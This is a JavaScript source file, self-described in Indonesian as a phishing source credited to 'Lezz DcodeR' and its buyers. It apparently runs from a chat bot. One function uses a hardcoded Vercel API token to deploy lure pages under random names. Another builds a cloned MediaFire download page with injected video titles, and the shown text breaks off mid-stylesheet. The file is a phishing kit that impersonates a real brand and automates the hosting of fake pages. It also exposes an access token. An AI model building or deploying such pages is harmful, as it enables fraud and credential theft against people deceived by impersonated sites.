/*
Source Phising Ini Di Copy Langsung Dari Website Resminya Oleh Lezz DcodeR

Credit: LezzDcodeR, Xnr Team, Gpt Assistant, And All Buyer
*/

const axios = require("axios")
const fs = require("fs")
const crypto = require("crypto")

async function upToVercel(ctx, path, webn) {
  const token = "n44LezAboxe1P0Q1pL5NtgWp"
  const webName = webn + "-" + crypto.randomBytes(5).toString("hex")

  const headers = {
    Authorization: `Bearer ${token}`,
    'Content-Type': 'application/json'
  }

  try {

    await axios.post(
      'https://api.vercel.com/v9/projects',
      { name: webName },
      { headers }
    )
    const fileContent = fs.readFileSync(path, 'utf8');

    const deployRes = await axios.post(
      'https://api.vercel.com/v13/deployments',
      {
        name: webName,
        files: [
          {
            file: "index.html",
            data: fileContent
          }
        ],
        projectSettings: { framework: null }
      },
      { headers }
    )

    ctx.reply("✅ Berhasil Membuat Link\n\n🔗 Link: https://" + webName + ".vercel.app/")
  } catch (err) {
    ctx.reply("⚠️ Gagal Membuat Link, Terjadi Kesalahan:\n\n" + err.message)
  }
}

async function mediafire(ctx, t, io, vn) {
const kode = String.raw`
<!DOCTYPE html>
<html lang="en-US">
<head>
    <meta charset="utf-8"/>
    <meta http-equiv="x-ua-compatible" content="ie=edge"/>
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"/>
    <title>${vn}</title>
    <meta name="keywords" content="online storage, free storage, cloud Storage, collaboration, backup file Sharing, share Files, photo backup, photo sharing, ftp replacement, cross platform, remote access, mobile access, send large files, recover files, file versioning, undelete, Windows, PC, Mac, OS X, Linux, iPhone, iPad, Android"/>
    <meta name="description" content="MediaFire is a simple to use free service that lets you put all your photos, documents, music, and video in a single place so you can access them anywhere and share them everywhere."/>
    <meta name="robots" content="noindex,nofollow"/>
    <meta name="googlebot" content="noindex,nofollow"/>
    <meta name="slurp" content="noindex,nofollow"/>
    <meta name="google-translate-customization" content="5587c1b0a958bf07-62a8e309de686e87-gc92f61279a2c8524-11"/>
        <meta property="fb:app_id" content="124578887583575">
                <meta property="og:type" content="website"/>
        <meta property="og:site_name" content="MediaFire"/>
        <meta property="og:locale" content="en_US"/>
        <meta property="og:url" content="https://www.mediafire.com/file/gpikhj7qgu0pyoz/${vn}.mp4/file"/>
        <meta property="og:title" content="${vn}"/>
        <meta property="og:image" content="https://static.mediafire.com/images/filetype/download/video.jpg"/>
        <meta property="og:description" content=""/>
        <meta name="twitter:card" content="summary_large_image"/>
        <meta name="twitter:site" content="@MediaFire"/>
        <meta name="twitter:url" content="https://www.mediafire.com/file/gpikhj7qgu0pyoz/${vn}.mp4/file"/>
        <meta name="twitter:title" content="${vn}"/>
        <meta name="twitter:image" content="https://static.mediafire.com/images/filetype/download/video.jpg"/>
        <meta name="twitter:description" content=""/>
        <link href="https://plus.google.com/+mediafire" rel="publisher"/>
        <meta itemprop="name" content="${vn}"/>
        <meta itemprop="image" content="https://static.mediafire.com/images/filetype/download/video.jpg"/>
        <meta itemprop="description" content=""/>
        <style type="text/css">
    :root{--mf-blue1:#000A27;--mf-blue2:#002369;--mf-blue3:#0045AD;--mf-blue4:#0070F0;--mf-blue5:#479DF4;--mf-blue6:#8FC7F8;--mf-blue7:#D6ECFD;--mf-blue8:#F5FAFF;--mf-green1:#082118;--mf-green2:#165A3A;--mf-green3:#259355;--mf-green4:#33CC66;--mf-green5:#6CDA8E;--mf-green6:#A5E9B7;--mf-green7:#DEF7E4;--mf-green8:#F7FDF8;--mf-gold1:#291F01;--mf-gold2:#705403;--mf-gold3:#B88A05;--mf-gold4:#FFBF07;--mf-gold5:#FFD14C;--mf-gold6:#FFE392;--mf-gold7:#FFF5D7;--mf-gold8:#FFFCF5;--mf-red1:#27100B;--mf-red2:#692B1D;--mf-red3:#AD4730;--mf-red4:#F06242;--mf-red5:#F48E77;--mf-red6:#F8BAAC;--mf-red7:#FDE6E1;--mf-red8:#FFF9F7;--mf-black:#0E1116;--mf-gray1:#1A1E28;--mf-gray2:#222835;--mf-gray3:#3D424E;--mf-gray4:#575B65;--mf-gray5:#72767E;--mf-gray6:#8C8F96;--mf-gray7:#A7A9AE;--mf-gray8:#C1C3C7;--mf-gray9:#DADEE0;--mf-gray10:#E9EAEB;--mf-gray11:#F4F4F5;--mf-gray12:#F6F6F7;--mf-gray13:#F9F9F9}button,hr,input{overflow:visible}audio,canvas,progress,video{display:inline-block}progress,sub,sup{vertical-align:baseline}[type=checkbox],[type=radio],legend{box-sizing:border-box;padding:0}html{line-height:1.15;-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%}body{margin:0}article,aside,details,figcaption,figure,footer,header,main,menu,nav,section{display:block}h1{font-size:2em;margin:.67em 0}figure{margin:1em 40px}hr{box-sizing:content-box;height:0}code,kbd,pre,samp{font-family:monospace,monospace;font-size:1em}a{background-color:transparent;-webkit-text-decoration-skip:objects}abbr[title]{border-bottom:none;text-decoration:underline;text-decoration:underline dotted}b,strong{font-weight:bolder}dfn{font-style:italic}mark{background-color:#ff0;color:#000}small{font-size:80%}sub,sup{font-size:75%;line-height:0;position:relative}sub{bottom:-.25em}sup{top:-.5em}audio:not([controls]){display:none;height:0}img{border-style:none}svg:not(:root){overflow:hidden}button,input,optgroup,select,textarea{font-family:sans-serif;font-size:100%;line-height:1.15;margin:0}button,select{text-transform:none}[type=reset],[type=submit],button,html [type=button]{-webkit-appearance:button}[type=button]::-moz-focus-inner,[type=reset]::-moz-focus-inner,[type=submit]::-moz-focus-inner,button::-moz-focus-inner{border-style:none;padding:0}[type=button]:-moz-focusring,[type=reset]:-moz-focusring,[type=submit]:-moz-focusring,button:-moz-focusring{outline:ButtonText dotted 1px}fieldset{padding:.35em .75em .625em}legend{color:inherit;display:table;max-width:100%;white-space:normal}textarea{overflow:auto}[type=number]::-webkit-inner-spin-button,[type=number]::-webkit-outer-spin-button{height:auto}[type=search]{-webkit-appearance:textfield;outline-offset:-2px}[type=search]::-webkit-search-cancel-button,[type=search]::-webkit-search-decoration{-webkit-appearance:none}::-webkit-file-upload-button{-webkit-appearance:button;font:inherit}summary{display:list-item}[hidden],template{display:none}html{font:normal normal normal 14px/1.6 'Open Sans',sans-serif}body{position:relative;top:0px;margin:0;padding:0;background:#f3f3f3;color:#222835;color:var(--mf-gray2);top:initial!important}body>.skiptranslate{display:none}.h1,.h2,.h3,.h4,.h5,.h6{font-weight:normal;line-height:1.4;margin-bottom:1rem}.h1{font-size:2.9rem}.h2{font-size:2.3rem}.h3{font-size:1.9rem}.h4{font-size:1.6rem}.h5{font-size:1.3rem}.h6{font-size:1rem;font-weight:bold}.font-weight-normal{font-weight:normal!important}.font-weight-bold{font-weight:bold!important}a{text-decoration:none;color:#0070F0;color:var(--mf-blue4)}a:hover{color:#002369;color:var(--mf-blue2)}ul,ol{list-style:none;padding:0}p,form{margin:0}textarea{line-height:1.6;border-width:1px;height:auto;padding:10px}body.modal-open{overflow:hidden}@supports (-webkit-overflow-scrolling:touch){body.modal-open{position:fixed}}.show-focus-outlines :not(.g-Select):focus,.lightTheme.show-focus-outlines .user-menu .g-Btn:focus,.darkTheme.show-focus-outlines .user-menu .g-Btn:focus{outline:0;box-shadow:inset 0 0 0 2px hsla(0,0%,100%,0.9),0 0 0 2px #002369;box-shadow:inset 0 0 0 2px hsla(0,0%,100%,0.9),0 0 0 2px var(--mf-blue2);border-radius:4px;z-index:1}.g-Btn{display:inline-block;vertical-align:middle;border-radius:3px;font-family:'Open Sans',sans-serif;font-size:11px;font-weight:normal;cursor:pointer;height:36px;line-height:36px;padding:0 15px;border:0;outline:0;text-transform:uppercase;text-align:center;-webkit-appearance:none;box-sizing:border-box}.g-Btn--primary{color:#fff;background:#0070F0;background:var(--mf-blue4)}.g-Btn--secondary{color:#575B65;color:var(--mf-gray4);background-color:#E9EAEB;background-color:var(--mf-gray10)}.g-Btn--tertiary{color:#fff;background:#6c3}.g-Btn--alt{color:#fff;background:#282f3d}.g-Btn:hover{background-image:-webkit-linear-gradient(top,rgba(0,0,0,.05),rgba(0,0,0,.05));background-image:-moz-linear-gradient(top,rgba(0,0,0,.05),rgba(0,0,0,.05));background-image:-ms-linear-gradient(top,rgba(0,0,0,.05),rgba(0,0,0,.05));background-image:-o-linear-gradient(top,rgba(0,0,0,.05),rgba(0,0,0,.05));background-image:linear-gradient(top,rgba(0,0,0,.05),rgba(0,0,0,.05))}.g-Btn--alt:hover{background-image:-webkit-linear-gradient(top,rgba(255,255,255,.08),rgba(255,255,255,.08));background-image:-moz-linear-gradient(top,rgba(255,255,255,.08),rgba(255,255,255,.08));background-image:-ms-linear-gradient(top,rgba(255,255,255,.08),rgba(255,255,255,.08));background-image:-o-linear-gradient(top,rgba(255,255,255,.08),rgba(255,255,255,.08));background-image:linear-gradient(top,rgba(255,255,255,.08),rgba(255,255,255,.08))}a.g-Btn--primary:hover,a.g-Btn--tertiary:hover,a.g-Btn--alt:hover{color:#fff}a.g-Btn--secondary:hover{color:#575B65;color:var(--mf-gray4)}.g-Icon{display:inline-block;vertical-align:middle;height:24px;width:24px;background-image:url(/images/icons/svg_dark/icons_sprite.svg);background-repeat:no-repeat}.g-Btn .g-Icon{margin:0 8px 0 -2px}.dropdown .g-Icon{margin-right:8px;opacity:0.5}.g-Icon--white{background-image:url(/images/icons/svg_light/icons_sprite.svg)}.g-Btn .g-Icon.g-Icon--right{margin:0 -2px 0 8px}.g-Icon--search{background-position:0 0}.g-Icon--add{background-position:-120px 0}.g-Icon--share{background-position:-192px 0}.g-Icon--settings{background-position:-720px 0}.g-Icon--upgrade{background-position:-792px 0}.g-Icon--help{background-position:-816px 0}.g-Icon--folder{background-position:-840px 0}.g-Icon--mobile{background-position:-888px 0}.g-Icon--link{background-position:-936px 0}.g-Icon--logout{background-position:-960px 0}.g-Icon--arrowRight{background-position:-1632px 0}.u-o5{opacity:0.5!important}.u-cf:after{visibility:hidden;display:block;font-size:0;content:" ";clear:both;height:0}.u-wrap{position:relative;max-width:960px;margin:0 auto}.g-Select{font-size:14px;height:30px;line-height:30px;border-radius:0;border:0 solid #E8E9EC;border-width:0 0 1px;background:#fff url(/images/icons/svg_dark/arrow_dropdown.svg) right center no-repeat;color:#282F3D;margin:0;padding:0 20px 0 0;box-sizing:border-box;-webkit-appearance:none;-moz-appearance:none;-webkit-border-radius:0px;transition:all .1s linear 0s}.g-Select:focus{outline:none;border-color:#0070F0;border-color:var(--mf-blue4);box-shadow:0 1px 0 0 #0070F0;box-shadow:0 1px 0 0 var(--mf-blue4)}.tooltip{display:none;position:absolute;font-size:11px;font-weight:400;line-height:16px;-moz-border-radius:5px;-webkit-border-radius:5px;border-radius:5px;padding:10px;-moz-box-shadow:0px 0px 0px 1px rgba(0,0,0,.05),0px 1px 5px 0 rgba(0,0,0,0.2),inset 0 1px 0 0 rgba(255,255,255,.2);-webkit-box-shadow:0px 0px 0px 1px rgba(0,0,0,.05),0px 1px 5px 0 rgba(0,0,0,0.2),inset 0 1px 0 0 rgba(255,255,255,.2);box-shadow:0px 0px 0px 1px rgba(0,0,0,.05),0px 1px 5px 0 rgba(0,0,0,0.2),inset 0 1px 0 0 rgba(255,255,255,.2);background:#fff;width:180px;text-align:center;text-transform:none;color:#000;z-index:20;white-space:normal}li:hover>.tooltip,div:hover>.tooltip,a:hover>.tooltip,span:hover>.tooltip{display:block}.tooltip.alt{color:#fff;background:#000}.tooltip.point-up:before,.tooltip.point-right:before,.tooltip.point-down:before,.tooltip.point-left:before{content:"";font-size:0px;line-height:0%;background:#fff;width:12px;height:12px;position:absolute;-moz-box-shadow:0px 0px 0px 1px rgba(0,0,0,.05),0px 1px 5px 0 rgba(0,0,0,0.2),inset 0 1px 0 0 rgba(255,255,255,.2);-webkit-box-shadow:0px 0px 0px 1px rgba(0,0,0,.05),0px 1px 5px 0 rgba(0,0,0,0.2),inset 0 1px 0 0 rgba(255,255,255,.2);box-shadow:0px 0px 0px 1px rgba(0,0,0,.05),0px 1px 5px 0 rgba(0,0,0,0.2),inset 0 1px 0 0 rgba(255,255,255,.2);-webkit-transform:rotate(45deg);-moz-transform:rotate(45deg);-ms-transform:rotate(45deg);-o-transform:rotate(45deg);transform:rotate(45deg)}.tooltip.point-up:after,.tooltip.point-right:after,.tooltip.point-down:after,.tooltip.point-left:after{content:"";background:#fff;width:20px;height:10px;position:absolute}.tooltip.point-left:after,.tooltip.point-right:after{width:10px;height:20px}.tooltip.alt:after{background:#000}.tooltip.alt:before{background:#000}.tooltip.point-up{top:100%;left:50%;margin:12px 0 0 -100px}.tooltip.point-left{left:100%;top:50%;margin:-20px 0 0 12px}.tooltip.point-down{bottom:100%;left:50%;margin:0 0 12px -100px}.tooltip.point-right{right:100%;top:50%;margin:-20px 12px 0 0}.tooltip.point-up:before{left:50%;top:-6px;margin:0 0 0 -6px}.tooltip.point-left:before{left:-6px;top:50%;margin:-6px 0 0 0}.tooltip.point-down:before{bottom:-6px;left:50%;margin:0 0 0 -6px}.tooltip.point-right:before{right:-6px;top:50%;margin:-6px 0 0 0}.tooltip.point-up:after{left:50%;top:0;margin:0 0 0 -10px}.tooltip.point-left:after{left:0;top:50%;margin:-10px 0 0 0}.tooltip.point-down:after{bottom:0;left:50%;margin:0 0 0 -10px}.tooltip.point-right:after{right:0;top:50%;margin:-10px 0 0 0}.tooltip.error-tip{padding-left:30px}.tooltip.error-tip:after{content:"";font-size:0px;line-height:0%;width:16px;height:16px;position:absolute;left:8px;top:8px;margin:0;background:url(/images/icons/warning-triangle.png) center no-repeat}.tooltipDismiss{position:absolute;background:#fff;height:18px;width:18px;border-radius:50%;right:8px;top:8px;color:#000;font-size:19px;line-height:18px;text-align:center;font-weight:bold;opacity:.6;cursor:pointer}.tooltipDismiss:after{content:"\00D7"}.tooltipDismiss:hover{opacity:.8}.d-hover:hover{background-image:-webkit-linear-gradient(top,rgba(0,0,0,.08),rgba(0,0,0,.08));background-image:-moz-linear-gradient(top,rgba(0,0,0,.08),rgba(0,0,0,.08));background-image:-ms-linear-gradient(top,rgba(0,0,0,.08),rgba(0,0,0,.08));background-image:-o-linear-gradient(top,rgba(0,0,0,.08),rgba(0,0,0,.08));background-image:linear-gradient(top,rgba(0,0,0,.08),rgba(0,0,0,.08))}#status{display:none;position:fixed;top:200px;left:50%;border-radius:5px;z-index:10000;color:white;text-align:center;width:400px;padding:30px;margin-left:-200px;background:rgba(0,0,0,0.75);cursor:pointer;box-sizing:border-box}@media (max-width:400px){#status{top:10px;left:10px;right:10px;margin:0;width:auto}}@media (max-height:500px){#status{top:10px}}#status-message{font-size:14px;font-weight:bold;line-height:1.3em;color:white;margin-bottom:10px}#status-close{font-size:10px;color:white}.labelSquare{-moz-border-radius:3px;-webkit-border-radius:3px;border-radius:3px;background:#555;color:#fff;vertical-align:text-bottom}.labelSquare.sm{-moz-border-radius:3px;-webkit-border-radius:3px;border-radius:3px;font-size:10px;padding:2px 4px}.lGood{background:#7EBB1B}.lNeutral{background:#aaa}.lWarning{background:#D85724}.dropdown{position:relative;-webkit-border-radius:3px;-moz-border-radius:3px;border-radius:3px}.dropdown ul{visibility:hidden;opacity:0;max-width:0px;max-height:0px;box-shadow:none;-moz-box-shadow:none;-webkit-box-shadow:none;-webkit-transition:visibility 0s linear .1s,max-width 0s linear .1s,max-height 0s linear .1s,opacity .1s linear 0s;-moz-transition:visibility 0s linear .1s,max-width 0s linear .1s,max-height 0s linear .1s,opacity .1s linear 0s;-o-transition:visibility 0s linear .1s,max-width 0s linear .1s,max-height 0s linear .1s,opacity .1s linear 0s;transition:visibility 0s linear .1s,max-width 0s linear .1s,max-height 0s linear .1s,opacity .1s linear 0s;position:absolute;top:100%;left:0px;z-index:52;padding:8px 0px;white-space:nowrap;background:#fff;-moz-background-clip:padding;-webkit-background-clip:padding-box;background-clip:padding-box;border-radius:0px 3px 3px 3px;font-size:14px;text-align:left;font-family:'Open Sans',sans-serif}.dropdown.hoverShow:hover>ul,.dropdown.show_dropdown>ul{visibility:visible;opacity:1;max-height:999px;max-width:999px;-webkit-transition-delay:0s;-moz-transition-delay:0s;-o-transition-delay:0s;transition-delay:0s;-webkit-box-shadow:0px 0px 0px 1px rgba(0,0,0,.15),0px 3px 6px 0px rgba(0,0,0,.15);box-shadow:0px 0px 0px 1px rgba(0,0,0,.15),0px 3px 6px 0px rgba(0,0,0,.15)}.dropdown .centerBtn+ul{left:1px}.ddRight.dropdown>ul{left:auto;right:0px;border-radius:3px 0px 3px 3px;margin-right:10px;-webkit-transition:left 0s linear .1s,right 0s linear .1s,margin-right 0s linear .1}.ddRight.dropdown .centerBtn+ul,.ddRight.dropdown .leftBtn+ul{margin-right:0px}.dropdown li:hover,.dropdown .zeroclipboard-is-hover{background-color:rgba(0,0,0,.05)}.dropdown li a{color:#575B65;color:var(--mf-gray4);display:block;padding:4px 30px}.dropdown li:hover a{color:#282f3d}.dropdown li.divider{cursor:default!important;background:none!important;color:#666!important;font-size:10px;font-weight:bold;line-height:15px;text-transform:uppercase;padding:15px 0 10px 20px;border-top:1px solid #e2e2e2;margin:15px 0 0 0}li.firstDivider.divider{margin-top:0px;padding-top:0;border:none}.dropdown li.submenu{position:relative}.dropdown li.submenu>ul{left:100%;top:0;margin:-9px 0 0 -2px;-webkit-border-radius:3px;-moz-border-radius:3px;border-radius:3px}.dropdown li.submenu:hover{background-color:#F2F2F3}.dropdown li.submenu:hover>ul{visibility:visible;opacity:1;max-height:999px;max-width:999px;-webkit-transition-delay:0s;-moz-transition-delay:0s;-o-transition-delay:0s;transition-delay:0s;-webkit-box-shadow:0px 0px 0px 1px rgba(0,0,0,.15),0px 3px 6px 0px rgba(0,0,0,.15);box-shadow:0px 0px 0px 1px rgba(0,0,0,.15),0px 3px 6px 0px rgba(0,0,0,.15)}.indicator-down,.indicator-up,.indicator-left,.indicator-right{position:absolute;height:12px;width:12px;right:0;top:50%;margin-top:-4px}li.ddSectionLabel{text-transform:uppercase;font-size:12px;color:#ABABAB;padding-top:5px;padding-bottom:0px;display:block;cursor:default}li.ddSectionLabel:hover{background:none;color:#ABABAB}.dropdown .checkbox{vertical-align:text-top;margin-left:0}li.ddStaticTxt{cursor:default;color:#575B65;color:var(--mf-gray4);font-style:italic;padding:4px 30px}li.ddStaticTxt:hover{background:transparent;color:#575B65;color:var(--mf-gray4)}.notificationBubble{height:16px;width:16px;line-height:16px;text-align:center;font-size:11px;color:white;border-radius:50%;background:#ef5939;display:inline-block;vertical-align:middle}.dropdown li .notificationBubble{margin-right:10px}#account .notificationBubble.top{position:absolute;top:-6px;left:40px;z-index:1}.labelRibbon{position:absolute;font-size:10px;text-transform:uppercase;font-weight:800;text-align:center;height:18px;width:64px;line-height:18px;top:19px;left:-5px;text-shadow:-1px 1px 0 rgba(0,0,0,.5);color:#fff;-webkit-transform:rotate(-45deg);-moz-transform:rotate(-45deg);-ms-transform:rotate(-45deg);-o-transform:rotate(-45deg);transform:rotate(-45deg);z-index:1;background-color:#262626;background-image:-webkit-linear-gradient(-90deg,rgba(255,255,255,.5),rgba(255,255,255,0));background-image:-moz-linear-gradient(-90deg,rgba(255,255,255,.5),rgba(255,255,255,0));background-image:-ms-linear-gradient(-90deg,rgba(255,255,255,.5),rgba(255,255,255,0));background-image:-o-linear-gradient(-90deg,rgba(255,255,255,.5),rgba(255,255,255,0));background-image:linear-gradient(-90deg,rgba(255,255,255,.5),rgba(255,255,255,0));border-radius:3px 3px 0 0}.labelRibbon:before,.labelRibbon:after{content:"";position:absolute;top:0;z-index:-1;border-color:transparent #262626 transparent transparent;border-style:solid;border-width:18px 18px 0px 18px;left:-35px}.labelRibbon:after{border-color:transparent transparent transparent #8e8e8e;left:auto;right:-35px}.windows.chrome .labelRibbon{-webkit-transform:translate3d(0,0,0) rotate(-45deg)}.labelRibbon.lrBlue{background-color:#1395EC}.labelRibbon.lrBlue:before{border-color:transparent #1395EC transparent transparent}.labelRibbon.lrBlue:after{border-color:transparent transparent transparent #85c8f5}.ie9 .labelRibbon:after{border-color:transparent transparent transparent #262626}.ie9 .labelRibbon.lrBlue:after{border-color:transparent transparent transparent #1395EC}.sandbox{display:block;position:fixed;z-index:10000000;box-shadow:0px 1px 2px 0px rgba(0,0,0,0.3);padding:0px 20px;margin:-5px -20px}.lightTheme .header,.darkTheme .header{background-color:#FFFFFF}.lightTheme .logo>a{background:url(/images/backgrounds/header/mf_logo_mono_reversed.svg) 0 center/180px auto no-repeat;opacity:.4}.lightTheme .user-menu .g-Btn{background-color:rgba(255,255,255,.15);box-shadow:inset 0 0 0 1px rgba(255,255,255,.08),0 0 0 1px rgba(0,0,0,.05);color:#fff}.lightTheme .user-menu .g-Btn:hover{background:rgba(255,255,255,.3)}.lightTheme .user-menu .g-Btn .g-Icon{background-image:url(/images/icons/svg_light/icons_sprite.svg);opacity:.7}.lightTheme .user-menu .g-Btn:hover .g-Icon{opacity:1}.lightTheme .user-menu .dropdown:not(.show_dropdown) #loggedin .smArrowDown{background-image:url(/images/icons/svg_light/icons_sprite.svg)}.darkTheme .logo>a{background:url(/images/backgrounds/header/mf_logo_mono.svg) 0 center/180px auto no-repeat;opacity:.4}.darkTheme .user-menu .g-Btn{background-color:rgba(255,255,255,.15);box-shadow:inset 0 0 0 1px rgba(255,255,255,.08),0 0 0 1px rgba(0,0,0,.05);color:rgba(0,0,0,.7)}.darkTheme .user-menu .g-Btn:hover{background:rgba(255,255,255,.3);color:#000}.darkTheme .user-menu .g-Btn .g-Icon{background-image:url(/images/icons/svg_dark/icons_sprite.svg);opacity:.7}.darkTheme .user-menu .g-Btn:hover .g-Icon{opacity:1}.customLogo .logo>a{background:url(//static.mediafire.com/images/backgrounds/header/mf_logo_full_color.svg) 0 center/contain no-repeat;opacity:1}.customLogo .logo{width:191px}.user-menu li.header-gt-cont{margin-right:10px}.gt-label{display:none;color:#828282;font-family:'Open Sans',sans-serif;font-size:12px}#goog-header-translate,#goog-footer-translate{display:inline-block;width:170px}#goog-header-translate{padding:0}#goog-footer-translate{margin-bottom:25px}#goog-header-translate>div,#goog-footer-translate>div{height:37px;font-size:0}#goog-header-translate>div span,#goog-footer-translate>div span{display:none}#goog-header-translate .goog-te-combo,#goog-footer-translate .goog-te-combo{font-size:13px;height:36px;line-height:36px;background:transparent url(/images/icons/svg_dark/arrow_dropdown.svg) right center no-repeat;border:0;border-radius:3px;margin:0;box-sizing:border-box;-webkit-appearance:none;-moz-appearance:none;width:100%;vertical-align:middle}#goog-header-translate .goog-te-combo::-ms-expand,#goog-footer-translate .goog-te-combo::-ms-expand{display:none}#goog-header-translate .goog-te-combo{padding:0 18px 0 50px}#goog-footer-translate .goog-te-combo{background-color:#fff;padding:0 20px 0 10px}#goog-header-translate .goog-te-combo:focus,#goog-footer-translate .goog-te-combo:focus{outline:none}.darkTheme #goog-header-translate .goog-te-combo{background-color:transparent;color:#000;border-color:rgba(0,0,0,.2)}.lightTheme #goog-header-translate .goog-te-combo{background-color:transparent;background-image:url(/images/icons/svg_light/arrow_dropdown.svg);color:#fff;border-color:rgba(255,255,255,.4)}@media (max-width:960px){#goog-footer-translate{margin-left:30px}}@media (max-width:770px){#goog-footer-translate{margin-top:25px;margin-bottom:0}}#goog-header-translate{background-size:24px;background-repeat:no-repeat;background-position:12px center}.en #goog-header-translate{background-image:url(/images/flags_svg/usa.svg)}.af #goog-header-translate{background-image:url(/images/flags_svg/zaf.svg)}.sq #goog-header-translate{background-image:url(/images/flags_svg/alb.svg)}.am #goog-header-translate{background-image:url(/images/flags_svg/eth.svg)}.ar #goog-header-translate{background-image:url(/images/flags_svg/egy.svg)}.hy #goog-header-translate{background-image:url(/images/flags_svg/arm.svg)}.az #goog-header-translate{background-image:url(/images/flags_svg/aze.svg)}.eu #goog-header-translate{background-image:url(/images/flags_svg/basque_country.svg)}.be #goog-header-translate{background-image:url(/images/flags_svg/blr.svg)}.bn #goog-header-translate{background-image:url(/images/flags_svg/bgd.svg)}.bs #goog-header-translate{background-image:url(/images/flags_svg/bih.svg)}.bg #goog-header-translate{background-image:url(/images/flags_svg/bgr.svg)}.ca #goog-header-translate{background-image:url(/images/flags_svg/and.svg)}.ceb #goog-header-translate{background-image:url(/images/flags_svg/phl.svg)}.ny #goog-header-translate{background-image:url(/images/flags_svg/mwi.svg)}.zh-CN #goog-header-translate{background-image:url(/images/flags_svg/chn.svg)}.zh-TW #goog-header-translate{background-image:url(/images/flags_svg/hkg.svg)}.co #goog-header-translate{background-image:url(/images/flags_svg/fra.svg)}.hr #goog-header-translate{background-image:url(/images/flags_svg/hrv.svg)}.cs #goog-header-translate{background-image:url(/images/flags_svg/cze.svg)}.da #goog-header-translate{background-image:url(/images/flags_svg/dnk.svg)}.nl #goog-header-translate{background-image:url(/images/flags_svg/nld.svg)}.eo #goog-header-translate{background-image:url(/images/flags_svg/esperanto.svg)}.et #goog-header-translate{background-image:url(/images/flags_svg/est.svg)}.tl #goog-header-translate{background-image:url(/images/flags_svg/phl.svg)}.fi #goog-header-translate{background-image:url(/images/flags_svg/fin.svg)}.fr #goog-header-translate{background-image:url(/images/flags_svg/fra.svg)}.fy #goog-header-translate{background-image:url(/images/flags_svg/nld.svg)}.gl #goog-header-translate{background-image:url(/images/flags_svg/esp.svg)}.ka #goog-header-translate{background-image:url(/images/flags_svg/geo.svg)}.de #goog-header-translate{background-image:url(/images/flags_svg/deu.svg)}.el #goog-header-translate{background-image:url(/images/flags_svg/grc.svg)}.gu #goog-header-translate{background-image:url(/images/flags_svg/ind.svg)}.ht #goog-header-translate{background-image:url(/images/flags_svg/hti.svg)}.ha #goog-header-translate{background-image:url(/images/flags_svg/ner.svg)}.haw #goog-header-translate{background-image:url(/images/flags_svg/usa.svg)}.iw #goog-header-translate{background-image:url(/images/flags_svg/isr.svg)}.hi #goog-header-translate{background-image:url(/images/flags_svg/ind.svg)}.hmn #goog-header-translate{background-image:url(/images/flags_svg/chn.svg)}.hu #goog-header-translate{background-image:url(/images/flags_svg/hun.svg)}.is #goog-header-translate{background-image:url(/images/flags_svg/isl.svg)}.ig #goog-header-translate{background-image:url(/images/flags_svg/nga.svg)}.id #goog-header-translate{background-image:url(/images/flags_svg/idn.svg)}.ga #goog-header-translate{background-image:url(/images/flags_svg/irl.svg)}.it #goog-header-translate{background-image:url(/images/flags_svg/ita.svg)}.ja #goog-header-translate{background-image:url(/images/flags_svg/jpn.svg)}.jw #goog-header-translate{background-image:url(/images/flags_svg/idn.svg)}.kn #goog-header-translate{background-image:url(/images/flags_svg/ind.svg)}.kk #goog-header-translate{background-image:url(/images/flags_svg/kaz.svg)}.km #goog-header-translate{background-image:url(/images/flags_svg/khm.svg)}.ko #goog-header-translate{background-image:url(/images/flags_svg/kor.svg)}.ku #goog-header-translate{background-image:url(/images/flags_svg/tur.svg)}.ky #goog-header-translate{background-image:url(/images/flags_svg/kgz.svg)}.lo #goog-header-translate{background-image:url(/images/flags_svg/lao.svg)}.la #goog-header-translate{background-image:url(/images/flags_svg/vat.svg)}.lv #goog-header-translate{background-image:url(/images/flags_svg/lva.svg)}.lt #goog-header-translate{background-image:url(/images/flags_svg/ltu.svg)}.lb #goog-header-translate{background-image:url(/images/flags_svg/lux.svg)}.mk #goog-header-translate{background-image:url(/images/flags_svg/mkd.svg)}.mg #goog-header-translate{background-image:url(/images/flags_svg/mdg.svg)}.ms #goog-header-translate{background-image:url(/images/flags_svg/mys.svg)}.ml #goog-header-translate{background-image:url(/images/flags_svg/ind.svg)}.mt #goog-header-translate{background-image:url(/images/flags_svg/mlt.svg)}.mi #goog-header-translate{background-image:url(/images/flags_svg/nzl.svg)}.mr #goog-header-translate{background-image:url(/images/flags_svg/ind.svg)}.mn #goog-header-translate{background-image:url(/images/flags_svg/mng.svg)}.my #goog-header-translate{background-image:url(/images/flags_svg/mmr.svg)}.ne #goog-header-translate{background-image:url(/images/flags_svg/ind.svg)}.no #goog-header-translate{background-image:url(/images/flags_svg/nor.svg)}.ps #goog-header-translate{background-image:url(/images/flags_svg/afg.svg)}.fa #goog-header-translate{background-image:url(/images/flags_svg/irn.svg)}.pl #goog-header-translate{background-image:url(/images/flags_svg/pol.svg)}.pt #goog-header-translate{background-image:url(/images/flags_svg/prt.svg)}.pa #goog-header-translate{background-image:url(/images/flags_svg/ind.svg)}.ro #goog-header-translate{background-image:url(/images/flags_svg/rou.svg)}.ru #goog-header-translate{background-image:url(/images/flags_svg/rus.svg)}.sm #goog-header-translate{background-image:url(/images/flags_svg/wsm.svg)}.gd #goog-header-translate{background-image:url(/images/flags_svg/sco.svg)}.sr #goog-header-translate{background-image:url(/images/flags_svg/srb.svg)}.st #goog-header-translate{background-image:url(/images/flags_svg/zaf.svg)}.sn #goog-header-translate{background-image:url(/images/flags_svg/zwe.svg)}.sd #goog-header-translate{background-image:url(/images/flags_svg/ind.svg)}.si #goog-header-translate{background-image:url(/images/flags_svg/lka.svg)}.sk #goog-header-translate{background-image:url(/images/flags_svg/svk.svg)}.sl #goog-header-translate{background-image:url(/images/flags_svg/svn.svg)}.so #goog-header-translate{background-image:url(/images/flags_svg/som.svg)}.es #goog-header-translate{background-image:url(/images/flags_svg/esp.svg)}.su #goog-header-translate{background-image:url(/images/flags_svg/idn.svg)}.sw #goog-header-translate{background-image:url(/images/flags_svg/uga.svg)}.sv #goog-header-translate{background-image:url(/images/flags_svg/swe.svg)}.tg #goog-header-translate{background-image:url(/images/flags_svg/tjk.svg)}.ta #goog-header-translate{background-image:url(/images/flags_svg/lka.svg)}.te #goog-header-translate{background-image:url(/images/flags_svg/ind.svg)}.th #goog-header-translate{background-image:url(/images/flags_svg/tha.svg)}.tr #goog-header-translate{background-image:url(/images/flags_svg/tur.svg)}.uk #goog-header-translate{background-image:url(/images/flags_svg/ukr.svg)}.ur 